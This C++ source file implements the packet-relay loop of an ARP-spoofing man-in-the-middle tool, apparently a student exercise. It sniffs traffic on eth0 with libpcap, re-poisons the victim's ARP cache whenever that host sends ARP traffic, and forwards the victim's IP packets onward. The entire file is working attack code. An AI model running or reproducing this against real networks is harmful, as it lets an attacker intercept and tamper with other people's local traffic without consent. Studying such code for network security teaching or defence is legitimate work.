// packet_spoof.cpp

#include <pcap.h>
#include <stdio.h>
#include <libnet.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "arp_spoof.h"

void packet_spoof(u_char *s_mac, u_char *d_mac, u_char *r_mac, struct in_addr s_ip, struct in_addr d_ip)
{
	pcap_t *handle;			//Session handle
	char dev[] = "eth0";		//The device to sniff on
	char errbuf[PCAP_ERRBUF_SIZE];	//Error string
	bpf_u_int32 mask;		//Our netmask
	bpf_u_int32 net;		//our IP
	struct pcap_pkthdr *header;	//The header that pcap gives us
	const u_char *packet;		//The actual packet
	u_char *tmp_packet;
	int result;

	struct libnet_ethernet_hdr *eth_hdr;
	struct libnet_ipv4_hdr *ip_hdr;
	struct libnet_arp_hdr *arp_hdr;		//arp hedaer

	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "Couldn't oupen device %s: %s\n", dev, errbuf);
		exit(1);
	}
		
	result = pcap_next_ex(handle, &header, &packet);

	while(1)
	{
		while(result > 0)	// If the packet was read without problems, return 1
		{	
			tmp_packet = (u_char *)malloc(header -> len);
			memcpy(tmp_packet, packet, header -> len);

			eth_hdr = (struct libnet_ethernet_hdr *)packet;
			arp_hdr = (struct libnet_arp_hdr *)(packet + LIBNET_ETH_H);
			ip_hdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);

			if(ntohs(eth_hdr -> ether_type) == ETHERTYPE_ARP &&
	   		   !memcmp(d_mac, eth_hdr -> ether_shost, ETHER_ADDR_LEN))
			{
				printf("Infect Sender again\n");
				
				send_arp((u_char *)packet, s_mac, d_mac, d_ip, s_ip, handle, header, 2);
			}
			else if(ntohs(eth_hdr -> ether_type) == ETHERTYPE_IP &&
				!memcmp(d_mac, eth_hdr -> ether_shost, ETHER_ADDR_LEN))
			{
				printf("Relay Packet!\n\n");
				send_arp((u_char *)packet, s_mac, r_mac, s_ip, d_ip, handle, header, 3);
			}

			result = pcap_next_ex(handle, &header, &packet);
			free(tmp_packet);
	/*
			while(result <= 0)
			{
			}*/
		}

		if(result <= 0)
		{
			result = pcap_next_ex(handle, &header, &packet);
		}
	}
	
	pcap_close(handle);

}
